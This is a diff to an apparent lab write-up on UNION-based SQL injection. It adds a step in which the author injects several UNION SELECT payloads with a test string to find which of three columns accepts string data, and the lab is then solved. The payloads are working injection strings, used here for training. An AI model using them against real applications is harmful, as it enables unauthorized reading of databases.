@@ -40,12 +40,26 @@ By injecting the following payloads one by one:
 ```
 I got that there were 3 columns  
 
-### 3. Attack with UNION-based SQLi
+### 3. Confirm UNION works
 Since there were 3 columns, the `UNION SELECT` statement must also return 3 columns.  
 I injected:  
 ```text
 '+UNION+SELECT+NULL,NULL,NULL--
 ```
+
+### 4. Identify the column compatible with string data  
+The lab provided the string `xNNySU`. I tested each column by replacing `NULL` with this string one by one:  
+```text
+'+UNION+SELECT+'xNNySU',NULL,NULL--
+```
+```text
+'+UNION+SELECT+NULL,'xNNySU',NULL--
+```
+```text
+'+UNION+SELECT+NULL,NULL,'xNNySU'--
+```
+The payload targeting the second column returned `200 OK`, while the other payloads resulted in an error. Therefore, the second column is compatible with string data.  
+
 And the lab was solved   
 ![Lab solved](img/04-lab-solved.png)
 
